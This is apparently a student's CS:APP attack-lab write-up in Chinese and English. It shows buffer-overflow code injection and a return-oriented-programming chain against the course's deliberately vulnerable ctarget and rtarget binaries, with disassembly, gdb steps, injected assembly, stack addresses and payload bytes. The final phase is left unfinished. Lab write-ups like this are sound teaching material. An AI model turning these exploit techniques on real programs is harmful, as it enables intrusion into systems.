# INSTRUCTIOJNS of attack lab

## How to use the material

1. Set the executability of hex2raw, ctarget and rtarget with `chmod -R 777 file`
2. Run with -q to avoid `FAILED: Initialization error: Running on an illegal host`
3. How to run in bash? under the folder, `unix> cat exploit.txt | ./hex2raw | ./ctarget -q` or `unix> ./ctarget -qi l1.bin` with l1.bin the output of attack text after `。/hex2raw <l1.txt >l1.bin`
4. look [attacklab.pdf](http://csapp.cs.cmu.edu/3e/attacklab.pdf) for usage
5. 关于farm.c

## Solutions

详见书3.7章 procedure 和3.10章 Combining Control and Data

如果我们直接在bash中输入`./ctarget -q`来运行可执行文件，会发现文件试图获取输入`Type string:`，由此可以猜测ctarget的漏洞在于缺乏对这个字符串缓冲区的保护，我们可以找到这个位置并将攻击代码注入

首先找到getbuf作为字符串缓冲区的入口，发现在test中调用了这个函数.
```s
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   

0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
```

### Attack 1
(Code-injection)

简而言之，attack1的原理就是利用函数getbuf中对于buffer长度没有限制的漏洞，将攻击代码注入可执行文件中

我们希望test中不执行getbuf,而是去执行touch1. 很显然，getbuf将rsp减0x28,也即创建了一个40bytes的buffer size. 在test调用getbuf后,程序计数器PC会调整为getbuf的地址,而将test的地址压入栈,放在getbuf的栈帧的高地址处. 因此我们的攻击代码需要填满缓冲区,然后将touch1的地址覆盖test的地址，这样getbuf后程序将跳转至touch1

顺序问题: 填充从栈帧的低地址位向高处填充,再者需要考虑小端数据的问题(因为机器是从低位开始读取的数据,且地址为64位=16个hex).最后攻击文本如l1.txt所示

Phase 1 switch the return address of test() from 0x1 to touch1()
getbuf() shows that it allows an input string of length 0x28(40), and return at 4017bd. So our goal is to overwrite the stack lower than 0x28.

touch1() is at 4017c0, to invade the part of test(), input with 40 arbitary bytes and c0 17 40 00 (remind the endian order, and return adress of getbuf() is pointed by %rsp, which is just at the end of the function)

### Attack 2
(Code-injection)

文档希望我们插入一些代码,而不只是数据.查看touch2,发现接受一个参数放在rdi,并和cookie比较.同样是覆盖buffer来实现攻击

这次我们不能只是插入touch2的地址来覆盖test(其中getbuf的下一步)的地址,因为这样只能完成跳转而不能完成传参.额外的手段是插入一段代码,而这段代码完成了传参cookie给%rdx和跳转至$4017ec.

通过撰写汇编文件code_2.s
```s
movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret
```
将其编译再反汇编,得到机器码
```s
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```
余下的工作就是放好这段代码,并试图让程序跳转至这段代码.

在此之前考虑这段代码的位置.想象栈帧是一个长方形的区域,当输入文本从左向右至上而下被读入,缓冲区的填充是从低地址向高地址,自右向左被填充.而为了方便确定位置,代码注入在文本开头,这样它在缓冲区中会出现在地址最低处,也就是%rsp指向的上方.而跳转代码必须出现在文本末尾,这样它才能覆盖掉处在缓冲区高地址处的return地址.而且代码不需要使用小端序,它的顺序是正常的.

最后找到这段代码插入的位置,也就是在程序执行到getbuf时%rsp的地址,gdb指令如下
```bash
gdb ./ctarget
break getbuf
run -qi l1.bin (此处l1.bin是随意的)
disas (查看是否正确地在getbuf停下,也可以注意到其中对%rsp加0x28的归还栈帧的操作)
stepi (再走一步,进入getbuf,breakpoint在函数入口处,而step只移动到下一个指令)
print /x $rsp
(也可以不step,而用x /64xb $rsp来查看%rsp周围,直接发现首地址,并发现40个字节后出现机器码,说明这确实是缓冲区)
```
最后获取到的%rsp地址为0x5561dc78

注意,这样的攻击是可行的,是因为这部分习题没有开启栈随机化,并且也允许栈执行.
```s
0000000000400df0 <__printf_chk@plt>:
  400df0:	ff 25 ca 32 20 00    	jmpq   *0x2032ca(%rip)        # 6040c0 <__printf_chk@GLIBC_2.3.4>
  400df6:	68 18 00 00 00       	pushq  $0x18
  400dfb:	e9 60 fe ff ff       	jmpq   400c60 <.plt>
```


Phase 2 wants to switch to touch2(), and in the same time input a val==cookie, stored in %edi

So we recover the buffer space and append our attack string. We wrote the assembly code and then dissemble to get the machine code


### Attack 3
touch3要实现的是传入string的ascii匹配, 我们要做的是将正确的ascii放在缓冲区中,并让%rdi获取这个ascii,最后让getbuf跳转回touch3 (0x4018fa)

cookie为 0x59b997fa, 对应ascii的hex表示为35 39 62 39 39 37 66 61 00 (多一位0)

我们依然是将最高位填成缓冲区开头的地址0x5561dc78,使得getbuf结束后回到缓冲区执行接下来的代码

在考虑缓冲区合理边界内的内容.文本中,我们将前两行留给机器码,第三行留给touch3的地址,最后一行留给cookie的ascii表示,这样我们的汇编代码应为
```s
mov $0x5561dc90, %rdi
mov $0x5561dc88, %rsp
ret
```
这里有一个问题.
官方的instruction pdf指出, hexmatch在执行时会改变rdi的位置, 而可以看到hexmatch申请了100字节的空间,这导致了getbuf的栈区一定会被全部覆盖.我们可以将cookie存放在父栈中,在父栈的栈顶之上,也就是0x5561dca8(栈顶要用来获取返回地址,所以不能使用)

### Attack 4
(ROP attack: return-oriented programming)
利用的是奇怪的函数巧妙的复现了某些操作的汇编代码,通过跳转来完成执行. Attack 4 即是用ROP的方法来重新完成level2, 要做的是给%rdi传值并跳转到touch2

但是没有办法完成直接的传值,只能通过将cookie放在栈顶,用`popq R`和`mov R %rdi`组合完成

然后开始找.发现:
```s
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq  

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq  
```
58 90 c3 的序列编码了
```s
popq %rax
nop
ret
```
而48 89 c7 90 c3 编码了
```s
movq %rax, %rdi
nop
ret
```
(好像两个c3连在一起不会发生什么事情,所以farm中有若干种选择)
缓冲区现在不能执行了(在栈上),所以缓冲区填啥应该关系不大,主要是再更高处分别填充:
```txt
ab 19 40 00 00 00 00 00 # popq %rax 
fa 97 b9 59 00 00 00 00 # cookie （popq的目标）
c5 19 40 00 00 00 00 00 # movq %rax,%rdi
ec 17 40 00 00 00 00 00 # 返回到 touch2
```

### Attack 5
level3是将cookie的ascii在hex下存入%rdi并跳转至touch3

上一问中我们不需要知道栈的具体位置,只需要把需要传进去的内容放在栈顶.但这一问中由于hexmatch将会覆盖整个缓冲区,必须将cookie的ascii放在其父栈上,这就要求我们知道栈的具体位置以及相应的偏移

具体不是很想做了,如果以后再搞起安全相关的再看吧. 据说还有和canary有关的attack6,实在是没兴趣了